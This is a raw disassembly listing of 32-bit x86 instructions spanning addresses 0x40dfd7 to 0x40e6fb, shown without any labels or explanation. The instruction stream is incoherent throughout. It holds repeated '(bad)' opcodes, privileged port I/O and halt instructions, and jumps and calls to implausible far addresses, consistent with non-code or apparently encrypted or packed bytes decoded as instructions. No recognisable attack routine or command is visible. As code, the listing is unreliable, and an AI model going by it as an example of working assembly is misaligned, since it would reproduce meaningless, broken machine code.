  40dfd7:	pmulhuw mm1,QWORD PTR [edx+0x63]
  40dfdb:	mov    cl,0xf9
  40dfdd:	jbe    0x40dfd8
  40dfdf:	xor    ch,BYTE PTR [edx-0x7fd7d147]
  40dfe5:	outs   dx,DWORD PTR ds:[esi]
  40dfe7:	cmc    
  40dfe8:	mov    ds:0x34dfb779,al
  40dfed:	mov    esi,eax
  40dfef:	sbb    eax,0xc75b21f6
  40dff4:	mov    edi,0x5b011327
  40dff9:	sar    BYTE PTR [edi+0x1a],cl
  40dffc:	shl    DWORD PTR [esi+0xf],1
  40dfff:	adc    ah,ah
  40e001:	jb     0x40e00d
  40e003:	pop    eax
  40e004:	sbb    ecx,DWORD PTR [esi]
  40e006:	xor    al,0xf1
  40e008:	sbb    BYTE PTR [ebp+0x522cefe9],dl
  40e00e:	push   esp
  40e00f:	jp     0x40dfa2
  40e011:	mov    al,ds:0xeacf38c4
  40e016:	xor    eax,0xf34a484b
  40e01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e01c:	in     al,dx
  40e01d:	mov    ch,0x8e
  40e01f:	outs   dx,BYTE PTR ds:[esi]
  40e020:	ficom  DWORD PTR [edx]
  40e022:	push   edi
  40e023:	mov    al,0xca
  40e025:	out    0xff,al
  40e027:	loopne 0x40e080
  40e029:	loopne 0x40e075
  40e02b:	outs   dx,BYTE PTR ds:[esi]
  40e02c:	test   DWORD PTR [edi-0x22],edx
  40e02f:	sbb    eax,0xf8dae3b2
  40e034:	(bad)  
  40e035:	and    al,0x7a
  40e037:	inc    eax
  40e038:	and    al,0x43
  40e03a:	not    edx
  40e03c:	ins    DWORD PTR es:[edi],dx
  40e03d:	cs jecxz 0x40dfc6
  40e040:	mul    DWORD PTR [edi+ebp*1]
  40e043:	dec    esi
  40e044:	mov    eax,ds:0x5862ef03
  40e049:	xchg   esp,eax
  40e04a:	retf   0xc58f
  40e04d:	not    BYTE PTR [edi]
  40e04f:	mov    WORD PTR [eax-0x47daf8db],es
  40e055:	pop    edi
  40e056:	or     al,BYTE PTR [eax+0x3d6e38ce]
  40e05c:	sbb    eax,0xc4c7d327
  40e061:	pusha  
  40e062:	pop    ebp
  40e063:	(bad)  
  40e064:	shl    DWORD PTR [eax],cl
  40e066:	mov    ds:0x5d6ec12f,al
  40e06b:	jmp    DWORD PTR [ebx+edi*1]
  40e06e:	je     0x40e0b3
  40e070:	xor    edi,DWORD PTR [edx+eiz*2]
  40e073:	test   DWORD PTR [ecx],edx
  40e075:	out    dx,eax
  40e076:	cmp    bl,ah
  40e078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e079:	ins    BYTE PTR es:[edi],dx
  40e07a:	pop    es
  40e07b:	lock mov dl,0x29
  40e07e:	mov    BYTE PTR [esi+0x13],al
  40e081:	cld    
  40e082:	(bad)  fs:[ebp+0x1f277a9b]
  40e089:	inc    ebx
  40e08a:	cmp    eax,0x6a1c3c61
  40e08f:	call   0xdb9c6b1c
  40e094:	push   esi
  40e095:	pop    edi
  40e096:	(bad)
  40e09a:	mov    edi,0xc8affd3f
  40e09f:	pop    ds
  40e0a0:	sub    edx,esp
  40e0a2:	adc    ebx,edx
  40e0a4:	jns    0x40e08e
  40e0a6:	mov    edi,0xf5dba8a8
  40e0ab:	stos   DWORD PTR es:[edi],eax
  40e0ac:	lods   al,BYTE PTR ds:[esi]
  40e0ad:	xor    DWORD PTR [esi],edi
  40e0af:	jmp    0x82dbc38f
  40e0b4:	jp     0x40e0f6
  40e0b6:	iret   
  40e0b7:	test   DWORD PTR [ebx+0x6f],eax
  40e0ba:	xlat   BYTE PTR ds:[ebx]
  40e0bb:	adc    DWORD PTR gs:[ecx+0x81dbd9c],0x336aaed0
  40e0c6:	sub    al,0xc9
  40e0c8:	ficomp WORD PTR [ebp-0x2c335924]
  40e0ce:	jnp    0x40e075
  40e0d0:	mov    ch,0x78
  40e0d2:	xchg   esi,eax
  40e0d3:	jecxz  0x40e091
  40e0d5:	add    eax,0x287a5e85
  40e0da:	sbb    eax,0xceef472
  40e0df:	add    al,0xbb
  40e0e1:	mov    al,0x4e
  40e0e3:	xor    ah,dl
  40e0e5:	in     al,0x66
  40e0e7:	jp     0x40e0ed
  40e0e9:	in     al,0x2e
  40e0eb:	outs   dx,BYTE PTR ds:[esi]
  40e0ec:	xchg   DWORD PTR [esi+0x6b7e5cff],esp
  40e0f2:	hlt    
  40e0f3:	pop    ecx
  40e0f4:	aad    0x2d
  40e0f6:	mov    eax,0x80dc6163
  40e0fb:	pushf  
  40e0fc:	sbb    ecx,DWORD PTR [ecx+0x49]
  40e0ff:	mov    ebx,0x76735e31
  40e104:	scas   al,BYTE PTR es:[edi]
  40e105:	pushf  
  40e106:	arpl   dx,bx
  40e108:	mov    ds:0x7d1f9e0d,eax
  40e10d:	imul   BYTE PTR [ebx]
  40e10f:	sub    eax,DWORD PTR [edx-0x4f]
  40e112:	push   cs
  40e113:	cmp    al,0x3e
  40e115:	mov    BYTE PTR ds:0x43afe8bc,al
  40e11b:	sbb    ebx,eax
  40e11d:	push   es
  40e11e:	push   edx
  40e11f:	mov    bh,0xb6
  40e121:	inc    ebp
  40e122:	jo     0x40e0e5
  40e124:	fldz   
  40e126:	pop    eax
  40e127:	jnp    0x40e10f
  40e129:	daa    
  40e12a:	loope  0x40e0ee
  40e12c:	mov    al,ds:0x2fb09078
  40e131:	xchg   ebx,esp
  40e133:	lods   al,BYTE PTR ds:[esi]
  40e134:	sbb    DWORD PTR [ebx],eax
  40e136:	std    
  40e137:	fmul   DWORD PTR [ebx]
  40e139:	gs lock and al,0x7a
  40e13d:	xchg   edx,eax
  40e13e:	les    esp,FWORD PTR [ebp-0x2c]
  40e141:	inc    esi
  40e142:	data16 fwait
  40e144:	pop    esp
  40e145:	push   0xd84385d
  40e14a:	clc    
  40e14b:	mov    ebp,0x3af5458b
  40e150:	xor    dh,BYTE PTR [ecx]
  40e152:	aad    0x4b
  40e154:	fwait
  40e155:	outs   dx,DWORD PTR ds:[esi]
  40e156:	pop    esp
  40e157:	addr16 pop ecx
  40e159:	and    al,0xbd
  40e15b:	pop    esp
  40e15c:	sbb    al,BYTE PTR [edx-0x7f12cf65]
  40e162:	jp     0x40e0f7
  40e164:	mov    BYTE PTR [eax],al
  40e166:	arpl   sp,bx
  40e168:	out    0x33,eax
  40e16a:	scas   eax,DWORD PTR es:[edi]
  40e16b:	test   BYTE PTR [esi],dl
  40e16d:	scas   eax,DWORD PTR es:[edi]
  40e16e:	pop    edi
  40e16f:	or     eax,0xd135aef1
  40e174:	int3   
  40e175:	adc    BYTE PTR [eax],bh
  40e177:	jb     0x40e1cb
  40e179:	adc    DWORD PTR [edx+0x44],0xffffffe0
  40e17d:	mov    eax,0x9ac85e7b
  40e182:	cdq    
  40e183:	imul   ebx,DWORD PTR [esi+0x5f512708],0x15
  40e18a:	sbb    BYTE PTR [edx-0xe],bl
  40e18d:	(bad)  
  40e18e:	clc    
  40e18f:	xlat   BYTE PTR ds:[ebx]
  40e190:	xor    al,dl
  40e192:	and    BYTE PTR [ebp-0x6fab6543],bl
  40e198:	imul   ebp,esi,0x1403a53c
  40e19e:	inc    esi
  40e19f:	xor    bh,BYTE PTR [ebp-0x342b31ea]
  40e1a5:	sbb    DWORD PTR [esi-0x64],0x73
  40e1a9:	(bad)  
  40e1ab:	mov    esp,0x9e149d75
  40e1b0:	mov    dl,BYTE PTR [edi-0x3e]
  40e1b3:	inc    ebp
  40e1b4:	jg     0x40e1c9
  40e1b6:	jl     0x40e228
  40e1b8:	popf   
  40e1b9:	jae    0x40e14a
  40e1bb:	scas   eax,DWORD PTR es:[edi]
  40e1bc:	ret    0xb0c1
  40e1bf:	or     DWORD PTR [edi+0x487e01d8],ecx
  40e1c5:	std    
  40e1c6:	sbb    BYTE PTR [ebp+0x25fc9291],0xfc
  40e1cd:	test   al,0x87
  40e1cf:	pop    ss
  40e1d0:	pop    ss
  40e1d1:	scas   al,BYTE PTR es:[edi]
  40e1d2:	jl     0x40e21d
  40e1d4:	and    BYTE PTR [edx-0x17],0x28
  40e1d8:	mov    al,ds:0x7d678f2a
  40e1dd:	js     0x40e1aa
  40e1df:	ins    BYTE PTR es:[edi],dx
  40e1e0:	xchg   ah,bh
  40e1e2:	inc    edx
  40e1e3:	push   edi
  40e1e4:	or     cl,BYTE PTR [eax+0x75]
  40e1e7:	adc    bl,cl
  40e1e9:	xor    eax,0x6c3d6d93
  40e1ee:	jns    0x40e240
  40e1f0:	adc    al,0x49
  40e1f2:	leave  
  40e1f3:	or     al,0x25
  40e1f5:	test   BYTE PTR [esi],dl
  40e1f7:	(bad)  
  40e1f8:	(bad)  
  40e1f9:	push   ecx
  40e1fa:	cmc    
  40e1fb:	jns    0x40e252
  40e1fd:	ret    
  40e1fe:	hlt    
  40e1ff:	lahf   
  40e200:	inc    ecx
  40e201:	sbb    esp,DWORD PTR [ecx+eax*1-0x28]
  40e205:	(bad)  
  40e206:	(bad)  
  40e207:	dec    edi
  40e208:	imul   edi,edi,0xffffffa3
  40e20b:	adc    DWORD PTR [eax+edx*1+0x7d],eax
  40e20f:	out    0xb9,al
  40e211:	dec    esp
  40e212:	mov    ch,0xfa
  40e214:	ss daa 
  40e216:	xor    BYTE PTR [ecx+0x3a654486],bh
  40e21c:	mov    al,0x9b
  40e21e:	sub    al,BYTE PTR [ebp+0x2f258f3e]
  40e224:	in     al,0xf9
  40e226:	sbb    BYTE PTR [esi],0x99
  40e229:	inc    edi
  40e22a:	aaa    
  40e22b:	inc    edx
  40e22c:	sti    
  40e22d:	cdq    
  40e22e:	inc    edx
  40e22f:	aas    
  40e230:	ret    0x8ed0
  40e233:	add    esp,DWORD PTR [ebp-0x28]
  40e236:	enter  0x478d,0x83
  40e23a:	inc    esp
  40e23b:	xlat   BYTE PTR ds:[ebx]
  40e23c:	push   ebp
  40e23d:	push   ecx
  40e23e:	ret    
  40e23f:	inc    edx
  40e240:	and    BYTE PTR [esi],dl
  40e242:	enter  0x64da,0x21
  40e246:	mov    dh,0x70
  40e248:	outs   dx,DWORD PTR ds:[esi]
  40e249:	mov    bh,0x6b
  40e24b:	mov    edx,0xa3bd8893
  40e250:	fimul  WORD PTR [eax+edi*2+0x5f]
  40e254:	lods   al,BYTE PTR ds:[esi]
  40e255:	loope  0x40e241
  40e257:	mov    edx,0xba495e18
  40e25c:	std    
  40e25d:	test   BYTE PTR [ebx],bh
  40e25f:	xchg   ecx,eax
  40e260:	out    0x38,eax
  40e262:	les    esp,FWORD PTR [edx-0x66]
  40e265:	outs   dx,DWORD PTR ds:[esi]
  40e266:	sub    ch,BYTE PTR [ecx]
  40e268:	xchg   edx,eax
  40e269:	test   eax,0xb63ffcbf
  40e26e:	nop
  40e26f:	(bad)  
  40e271:	xchg   ecx,eax
  40e272:	mov    BYTE PTR [edi+ecx*4],dl
  40e275:	jne    0x40e276
  40e277:	test   BYTE PTR [edx+0x2dba1de0],al
  40e27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e27e:	loopne 0x40e238
  40e280:	sbb    esp,ebp
  40e282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e283:	mov    DWORD PTR [ebx],ebp
  40e285:	mov    ecx,0xac690b98
  40e28a:	sbb    dl,BYTE PTR [edi]
  40e28c:	or     al,BYTE PTR [ebp-0x15]
  40e28f:	lahf   
  40e290:	aad    0xc1
  40e292:	fld    QWORD PTR [edx-0x75]
  40e295:	pop    ebx
  40e296:	jns    0x40e266
  40e298:	cld    
  40e299:	mov    ecx,esi
  40e29b:	jmp    0xcfff7ce0
  40e2a0:	pop    ebp
  40e2a1:	pop    esp
  40e2a2:	icebp  
  40e2a3:	mov    DWORD PTR [eax-0x1],0x98a111dc
  40e2aa:	xchg   esi,eax
  40e2ab:	adc    DWORD PTR [edi-0x54508a2c],esp
  40e2b1:	mov    cl,0x4a
  40e2b3:	and    BYTE PTR [edx],ch
  40e2b5:	and    al,0x30
  40e2b7:	in     al,0x79
  40e2b9:	daa    
  40e2ba:	lfs    esp,FWORD PTR [edx+0x31368c7b]
  40e2c1:	outs   dx,DWORD PTR ds:[esi]
  40e2c2:	pop    es
  40e2c3:	in     eax,dx
  40e2c4:	sub    al,0x8
  40e2c6:	or     cl,BYTE PTR [esi+0x7cd4b67d]
  40e2cc:	loope  0x40e320
  40e2ce:	jmp    0x40e276
  40e2d0:	aas    
  40e2d1:	out    dx,eax
  40e2d2:	add    esi,edi
  40e2d4:	jae    0x40e2ca
  40e2d6:	pop    ds
  40e2d7:	or     edx,esp
  40e2d9:	xor    esi,esp
  40e2db:	push   edi
  40e2dc:	retf   0xe63b
  40e2df:	push   ss
  40e2e0:	push   esp
  40e2e1:	sub    al,0x9d
  40e2e3:	dec    edx
  40e2e4:	xor    ch,ch
  40e2e6:	mov    dh,0x87
  40e2e8:	cmc    
  40e2e9:	jmp    0x4a81:0x9ab43e05
  40e2f0:	xchg   ecx,eax
  40e2f1:	push   edx
  40e2f2:	inc    BYTE PTR [ebp+eax*4+0x60539db0]
  40e2f9:	mov    DWORD PTR [edi-0x593c424b],0xdad44701
  40e303:	mov    edi,DWORD PTR [ebx]
  40e305:	mov    ?,WORD PTR ds:0xce82c7f5
  40e30b:	(bad)  
  40e30c:	popf   
  40e30d:	(bad)  
  40e30e:	in     al,0x3b
  40e310:	dec    eax
  40e311:	jg     0x40e2f9
  40e313:	mov    ebx,edx
  40e315:	jmp    0x6d3a4a7f
  40e31a:	xchg   DWORD PTR [ebx-0x59],ebx
  40e31d:	jle    0x40e2ea
  40e31f:	in     eax,0xa4
  40e321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e323:	sub    BYTE PTR [esi],ch
  40e325:	icebp  
  40e326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e327:	xchg   ecx,eax
  40e328:	jmp    0xf9d94024
  40e32d:	or     al,0xc3
  40e32f:	fdiv   QWORD PTR [edx+edx*4-0x75881d8]
  40e336:	push   cs
  40e337:	dec    esi
  40e338:	push   cs
  40e339:	ret    
  40e33a:	test   DWORD PTR gs:[esi+ebx*1+0x4e815323],0x5aaa4a1d
  40e346:	out    0xed,eax
  40e348:	hlt    
  40e349:	shl    ecx,0xb2
  40e34c:	test   al,0x38
  40e34e:	xchg   DWORD PTR [eax],ecx
  40e350:	xchg   ecx,eax
  40e351:	jno    0x40e376
  40e353:	xlat   BYTE PTR ds:[ebx]
  40e354:	test   ah,0x6f
  40e357:	pushf  
  40e358:	inc    esp
  40e359:	call   0xb62a69cd
  40e35e:	stos   BYTE PTR es:[edi],al
  40e35f:	leave  
  40e360:	in     eax,dx
  40e361:	cdq    
  40e362:	mov    ecx,0x43651f63
  40e367:	and    eax,0x2f930594
  40e36c:	push   cs
  40e36d:	jb     0x40e397
  40e36f:	xchg   ebp,eax
  40e370:	sbb    DWORD PTR [edi+ecx*4],eax
  40e373:	mov    ebp,0xb4f5b364
  40e378:	shr    eax,cl
  40e37a:	dec    ebp
  40e37b:	sub    esi,DWORD PTR [eax-0x30]
  40e37e:	ins    BYTE PTR es:[edi],dx
  40e37f:	pop    edx
  40e380:	push   ecx
  40e381:	jns    0x40e387
  40e383:	aas    
  40e384:	cs stos BYTE PTR es:[edi],al
  40e386:	pop    esi
  40e387:	dec    esp
  40e388:	add    DWORD PTR [ecx-0x39],ecx
  40e38b:	iret   
  40e38c:	js     0x40e3ea
  40e38e:	rcl    BYTE PTR [eiz*1-0x7bd8ba54],1
  40e395:	stc    
  40e396:	pop    ss
  40e397:	mov    bl,BYTE PTR [ebp-0x75]
  40e39a:	xor    eax,0x83b6ab4f
  40e39f:	cmp    ah,cl
  40e3a1:	sub    bl,ch
  40e3a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3a4:	test   DWORD PTR [esi-0x768bd2f4],0x2b515ee0
  40e3ae:	leave  
  40e3af:	sub    eax,0xfe52c93
  40e3b4:	shl    BYTE PTR [eax+ebx*2],0x0
  40e3b8:	lahf   
  40e3b9:	(bad)  
  40e3ba:	cmp    eax,0x36b077e8
  40e3bf:	in     eax,0x19
  40e3c1:	repnz frstor [edi+0x75]
  40e3c5:	ja     0x40e395
  40e3c7:	ficom  WORD PTR [ecx+0x2b9c2669]
  40e3cd:	xchg   ebp,eax
  40e3ce:	stc    
  40e3cf:	mov    ds:0xd69991c7,al
  40e3d4:	into   
  40e3d5:	jle    0x40e3ef
  40e3d7:	dec    edx
  40e3d8:	cmp    BYTE PTR [esi-0x4947607f],ah
  40e3de:	ret    
  40e3df:	ret    0xfd2a
  40e3e2:	mov    cl,0x54
  40e3e4:	cwde   
  40e3e5:	jns    0x40e3d2
  40e3e7:	stc    
  40e3e8:	test   bh,ah
  40e3ea:	jae    0x40e36e
  40e3ec:	outs   dx,DWORD PTR ds:[esi]
  40e3ed:	mov    WORD PTR [ecx],cs
  40e3ef:	test   DWORD PTR ds:0xb8a3776f,0x90eb68ab
  40e3f9:	pop    ebp
  40e3fa:	test   eax,0x47c07e99
  40e3ff:	ins    BYTE PTR es:[edi],dx
  40e400:	ins    DWORD PTR es:[edi],dx
  40e401:	cs mov ch,0x70
  40e404:	loopne 0x40e3d0
  40e406:	mov    eax,ds:0x6bacd10f
  40e40b:	sub    esp,DWORD PTR [esi]
  40e40d:	retf   
  40e40e:	inc    esi
  40e40f:	ret    0x2fd
  40e412:	jae    0x40e3d7
  40e414:	(bad)  
  40e415:	xlat   BYTE PTR ds:[ebx]
  40e416:	test   al,0x8d
  40e418:	jecxz  0x40e43b
  40e41a:	cmp    eax,0xe2fafd4e
  40e41f:	fadd   DWORD PTR [ebp+esi*1-0x66]
  40e423:	jmp    0x4233:0x9ada63e3
  40e42a:	and    eax,DWORD PTR [ecx+0x2d]
  40e42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e42f:	vorps  xmm5,xmm3,XMMWORD PTR [edx-0x53]
  40e434:	mov    edx,esi
  40e436:	les    ecx,FWORD PTR [edx+0x5]
  40e439:	sbb    DWORD PTR [eax+edi*1],esi
  40e43c:	xchg   edi,eax
  40e43d:	pop    ebx
  40e43e:	pop    ebp
  40e43f:	xlat   BYTE PTR ds:[ebx]
  40e440:	sbb    eax,0x41e2c26e
  40e445:	in     al,0x84
  40e447:	xor    ch,dh
  40e449:	bnd call 0x50fcbd97
  40e44f:	imul   esi,edx,0xa5069463
  40e455:	add    eax,0x371675a1
  40e45a:	xchg   esi,eax
  40e45b:	clc    
  40e45c:	sub    DWORD PTR [ebx-0x65],0x3c
  40e460:	push   0xffffffc7
  40e462:	mov    eax,ds:0x47475b9f
  40e467:	xor    al,0x8e
  40e469:	jnp    0x40e483
  40e46b:	pop    ds
  40e46c:	lds    esi,FWORD PTR [edx-0x7c]
  40e46f:	and    BYTE PTR [ebp-0x465ffd01],dh
  40e475:	pusha  
  40e476:	jnp    0x40e4ed
  40e478:	bound  edi,QWORD PTR ds:0x41217f9f
  40e47e:	(bad)  
  40e47f:	into   
  40e480:	and    ebp,ebx
  40e482:	inc    esi
  40e483:	inc    ebx
  40e484:	mov    ah,0x84
  40e486:	jl     0x40e458
  40e488:	sbb    dl,al
  40e48a:	leave  
  40e48b:	sbb    al,0xf7
  40e48d:	lahf   
  40e48e:	inc    ecx
  40e48f:	lods   al,BYTE PTR ds:[esi]
  40e490:	dec    ecx
  40e491:	outs   dx,BYTE PTR ds:[esi]
  40e492:	lods   al,BYTE PTR ds:[esi]
  40e493:	mov    ebx,0x56457e5
  40e498:	mov    dh,0x6a
  40e49a:	adc    eax,0x67ae7aee
  40e49f:	stos   DWORD PTR es:[edi],eax
  40e4a0:	shr    DWORD PTR [ecx],0xb0
  40e4a3:	mov    eax,0x3275c5ac
  40e4a8:	mov    esi,0xdcb8f180
  40e4ad:	and    bl,BYTE PTR [ebx+0x1669a706]
  40e4b3:	sahf   
  40e4b4:	xor    bh,bl
  40e4b6:	push   ds
  40e4b7:	cmp    dl,BYTE PTR [edx-0x6cc7a0a6]
  40e4bd:	mov    ah,0x3
  40e4bf:	add    esi,esp
  40e4c1:	(bad)  
  40e4c2:	(bad)  
  40e4c4:	sbb    al,0x1
  40e4c6:	add    eax,0x8aee650d
  40e4cb:	jl     0x40e521
  40e4cd:	sub    eax,0xdb7790c5
  40e4d2:	sbb    eax,DWORD PTR [ebp+0x68]
  40e4d5:	retf   0x4082
  40e4d8:	push   esp
  40e4d9:	in     eax,dx
  40e4da:	pop    esi
  40e4db:	hlt    
  40e4dc:	test   ch,bh
  40e4de:	ret    
  40e4df:	pop    ds
  40e4e0:	push   esp
  40e4e1:	int    0x7c
  40e4e3:	pusha  
  40e4e4:	(bad)  
  40e4e5:	popa   
  40e4e6:	fst    st(3)
  40e4e8:	xchg   DWORD PTR [ebx],ebx
  40e4ea:	lea    edx,[esi+0x46]
  40e4ed:	push   ebx
  40e4ee:	add    ebp,DWORD PTR [esi+eiz*2-0x5ae30e62]
  40e4f5:	dec    ecx
  40e4f6:	xchg   edi,eax
  40e4f7:	hlt    
  40e4f8:	ret    
  40e4f9:	popa   
  40e4fa:	push   cs
  40e4fb:	stc    
  40e4fc:	mov    ebx,0xe05ddbcf
  40e501:	hlt    
  40e502:	daa    
  40e503:	outs   dx,DWORD PTR ds:[esi]
  40e504:	and    BYTE PTR [ebx-0x28],ch
  40e507:	xor    eax,0xe121909d
  40e50c:	jmp    0x40e4c7
  40e50e:	mov    ebp,DWORD PTR [edx-0x69]
  40e511:	sahf   
  40e512:	call   0xb330:0x3b92d8f0
  40e519:	fst    QWORD PTR [edx+0x58d58553]
  40e51f:	cmp    dh,cl
  40e521:	bound  esi,QWORD PTR ds:0x12aa63f
  40e527:	fiadd  DWORD PTR [eax]
  40e529:	iret   
  40e52a:	inc    ecx
  40e52b:	jecxz  0x40e506
  40e52d:	or     al,0x82
  40e52f:	in     eax,dx
  40e530:	fdivr  QWORD PTR [ebx+0x21dc2215]
  40e536:	test   DWORD PTR [ecx],edx
  40e538:	mov    ebp,0x4fdb870a
  40e53d:	add    eax,ebp
  40e53f:	test   DWORD PTR [edx-0x307d738d],0xfbb5cb16
  40e549:	jl     0x40e55b
  40e54b:	push   ebx
  40e54c:	(bad)  
  40e54d:	ins    BYTE PTR es:[edi],dx
  40e54e:	xchg   BYTE PTR [esi+0x0],bl
  40e551:	and    eax,0x8437338d
  40e556:	mov    al,0x4d
  40e558:	leave  
  40e559:	xchg   ebp,eax
  40e55a:	adc    DWORD PTR [ecx],ebx
  40e55c:	jmp    0xe375038f
  40e561:	sub    eax,0xbc4bf299
  40e566:	mov    bl,0xc8
  40e568:	dec    edi
  40e569:	mov    ds:0xfc213e41,eax
  40e56e:	cmp    ecx,DWORD PTR [ebx]
  40e570:	rol    BYTE PTR [edi],1
  40e572:	mov    ch,0x99
  40e574:	outs   dx,DWORD PTR ds:[esi]
  40e575:	jp     0x40e5c9
  40e577:	call   0x54be:0xe4c81c28
  40e57e:	in     al,dx
  40e57f:	daa    
  40e580:	pop    edi
  40e581:	push   ss
  40e582:	das    
  40e583:	aas    
  40e584:	sar    DWORD PTR [edi],1
  40e586:	xchg   ebp,eax
  40e587:	int3   
  40e588:	(bad)  
  40e589:	or     al,0xe8
  40e58b:	rol    BYTE PTR [edi+edx*8],0xee
  40e58f:	jnp    0x40e529
  40e591:	iret   
  40e592:	push   ds
  40e593:	es cld 
  40e595:	rol    DWORD PTR [ebp-0x38f0291e],0xac
  40e59c:	xor    al,0x71
  40e59e:	out    dx,eax
  40e59f:	fnsave [eax]
  40e5a1:	xchg   esi,eax
  40e5a2:	or     DWORD PTR [ecx],eax
  40e5a4:	jo     0x40e593
  40e5a6:	(bad)  
  40e5a7:	nop
  40e5a8:	add    BYTE PTR ds:0x138d8218,dl
  40e5ae:	fstp   QWORD PTR [ebp-0x46]
  40e5b1:	adc    eax,0xaef167ab
  40e5b6:	or     BYTE PTR [eax+0x36],bl
  40e5b9:	xor    edi,esp
  40e5bb:	jp     0x40e609
  40e5bd:	retf   0x824e
  40e5c0:	(bad)  
  40e5c1:	xchg   ecx,eax
  40e5c2:	or     al,0x95
  40e5c4:	jne    0x40e5a4
  40e5c6:	add    al,0xe2
  40e5c8:	jo     0x40e62b
  40e5ca:	icebp  
  40e5cb:	cmp    eax,0x6dcf32f0
  40e5d0:	fldenv [esi-0x4a]
  40e5d3:	xchg   esp,eax
  40e5d4:	or     esi,DWORD PTR [ecx]
  40e5d6:	sti    
  40e5d7:	(bad)  
  40e5d8:	cli    
  40e5d9:	add    al,0xbd
  40e5db:	adc    bl,bl
  40e5dd:	mov    ebx,0xfd5c6a49
  40e5e2:	enter  0x90d3,0x15
  40e5e6:	sub    al,dl
  40e5e8:	jb     0x40e59e
  40e5ea:	retf   0xf32a
  40e5ed:	pop    eax
  40e5ee:	imul   ecx,DWORD PTR [esi-0x3b],0x199e245f
  40e5f5:	nop    DWORD PTR [ebp-0x6fa91da3]
  40e5fc:	pop    es
  40e5fd:	mov    WORD PTR [esi+0x3478af71],gs
  40e603:	sbb    bh,BYTE PTR [ecx-0x1e]
  40e606:	push   ecx
  40e607:	sbb    BYTE PTR [edx],bl
  40e609:	jg     0x40e5fe
  40e60b:	dec    edx
  40e60c:	pop    ebp
  40e60d:	scas   eax,DWORD PTR es:[edi]
  40e60e:	lods   eax,DWORD PTR ds:[esi]
  40e60f:	pop    es
  40e610:	add    edi,eax
  40e612:	ret    
  40e613:	ror    ebp,cl
  40e615:	jae    0x40e624
  40e617:	cmp    DWORD PTR [eax],ebx
  40e619:	shl    DWORD PTR [ecx],1
  40e61b:	(bad)  
  40e61c:	ins    DWORD PTR es:[edi],dx
  40e61d:	xchg   edx,eax
  40e61e:	sub    al,0x28
  40e620:	les    ecx,FWORD PTR ds:[ebx]
  40e623:	jg     0x40e617
  40e625:	adc    DWORD PTR ds:0xab89763a,ebx
  40e62b:	test   DWORD PTR [edi+esi*8+0x72af7019],ebp
  40e632:	push   0x16b7efe0
  40e637:	pop    ebp
  40e638:	call   0x8f0d04c1
  40e63d:	jno    0x40e625
  40e63f:	dec    ebp
  40e640:	jecxz  0x40e686
  40e642:	in     eax,dx
  40e643:	sahf   
  40e644:	pop    ecx
  40e645:	sub    ecx,DWORD PTR [ebx]
  40e647:	rcr    DWORD PTR [eax-0x5b],cl
  40e64a:	jp     0x40e5f3
  40e64c:	adc    BYTE PTR [esi-0x7d],cl
  40e64f:	cmp    bl,BYTE PTR [esi]
  40e651:	outs   dx,BYTE PTR ds:[esi]
  40e652:	(bad)  
  40e653:	mov    bh,0x42
  40e655:	stos   BYTE PTR es:[edi],al
  40e656:	inc    ebx
  40e657:	sahf   
  40e658:	and    ah,ah
  40e65a:	call   FWORD PTR [ecx]
  40e65c:	xchg   esp,eax
  40e65d:	and    dl,0x75
  40e660:	(bad)  
  40e661:	cmp    ah,al
  40e663:	and    edi,edx
  40e665:	sbb    BYTE PTR ss:[eax],dh
  40e668:	dec    edx
  40e669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e66a:	xchg   ecx,eax
  40e66b:	and    DWORD PTR [ebp-0x1e],ebx
  40e66e:	loop   0x40e624
  40e670:	pop    ds
  40e671:	xor    esi,ecx
  40e673:	icebp  
  40e674:	mov    ebx,0xf6a062bd
  40e679:	jp     0x40e6e5
  40e67b:	push   eax
  40e67c:	aad    0xe4
  40e67e:	adc    bh,cl
  40e680:	mov    eax,0xcf85cb5b
  40e685:	stc    
  40e686:	or     ah,BYTE PTR [edi]
  40e688:	pop    ebx
  40e689:	mov    BYTE PTR [ecx+0x4f0f781f],dh
  40e68f:	ret    0xf6c
  40e692:	adc    bh,BYTE PTR [edi]
  40e694:	pop    ebx
  40e695:	sbb    ecx,ebx
  40e697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e698:	push   0x3d
  40e69a:	fadd   QWORD PTR [ebp+0x2c2c53fa]
  40e6a0:	stos   DWORD PTR es:[edi],eax
  40e6a1:	daa    
  40e6a2:	bound  ebp,QWORD PTR [ebp+0x33]
  40e6a5:	iret   
  40e6a6:	mov    al,ds:0x7f7f71c4
  40e6ab:	adc    eax,0x17473f8
  40e6b0:	and    cl,dl
  40e6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6b3:	dec    eax
  40e6b4:	jns    0x40e646
  40e6b6:	fldcw  WORD PTR [edi+0x1655c5a8]
  40e6bc:	mov    ebx,0x4befd0c0
  40e6c1:	loop   0x40e729
  40e6c3:	loop   0x40e6d1
  40e6c5:	fwait
  40e6c6:	sub    ebp,DWORD PTR ss:[edx]
  40e6c9:	outs   dx,BYTE PTR cs:[esi]
  40e6cb:	call   FWORD PTR [ebx]
  40e6cd:	sbb    dh,dh
  40e6cf:	adc    DWORD PTR [esi],eax
  40e6d1:	ins    BYTE PTR es:[edi],dx
  40e6d2:	mov    eax,DWORD PTR ds:0x52342c74
  40e6d8:	div    bh
  40e6da:	js     0x40e708
  40e6dc:	imul   edx,DWORD PTR [esi],0x24
  40e6df:	dec    ebx
  40e6e0:	dec    edx
  40e6e1:	pop    edi
  40e6e2:	bnd ret 0x7e94
  40e6e6:	mov    al,dh
  40e6e8:	(bad)  
  40e6ea:	test   al,0x59
  40e6ec:	aad    0x39
  40e6ee:	jb     0x40e765
  40e6f0:	je     0x40e709
  40e6f2:	clc    
  40e6f3:	cld    
  40e6f4:	dec    esi
  40e6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6f6:	mov    bh,0x95
  40e6f8:	sbb    esp,DWORD PTR [esi]
  40e6fa:	retf   
  40e6fb:	pop    es
